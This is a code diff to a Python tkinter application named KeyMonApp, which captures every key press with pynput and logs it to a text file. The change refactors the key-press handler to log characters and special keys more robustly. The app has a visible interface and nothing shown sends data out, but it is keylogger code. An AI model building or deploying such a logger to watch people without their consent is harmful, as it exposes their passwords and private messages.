@@ -2,7 +2,6 @@ import tkinter as tk
 from tkinter import messagebox
 from pynput import keyboard
 import logging
-import os
 
 # Set up logging to a file
 log_file = "key_log.txt"
@@ -40,9 +39,12 @@ class KeyMonApp:
 
     def on_press(self, key):
         try:
-            logging.info(f"Key pressed: {key.char}")
-        except AttributeError:
-            logging.info(f"Special key pressed: {key}")
+            if hasattr(key, 'char') and key.char is not None:
+                logging.info(f"Key pressed: {key.char}")
+            else:
+                logging.info(f"Special key pressed: {key}")
+        except Exception as e:
+            logging.error(f"Error logging key press: {e}")
 
     def start_keylogger(self):
         if not self.running:
